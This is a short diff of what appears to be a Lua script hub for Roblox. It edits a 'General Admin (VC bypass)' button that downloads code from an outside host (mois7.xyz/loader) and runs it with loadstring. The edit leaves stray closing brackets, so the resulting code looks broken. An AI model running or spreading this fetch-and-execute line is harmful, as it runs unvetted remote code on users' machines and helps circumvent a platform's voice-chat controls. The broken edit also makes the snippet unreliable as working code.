@@ -980,8 +980,7 @@ createHubButton(generalPage, "General Admin (VC bypass)", function()
 
 	task.spawn(function()
 		local success, err = pcall(function()
-			loadstring(game:HttpGet(
-				"https://mois7.xyz/loader"
+			loadstring(game:HttpGet("https://mois7.xyz/loader"))()
 			))()
 		end)
 
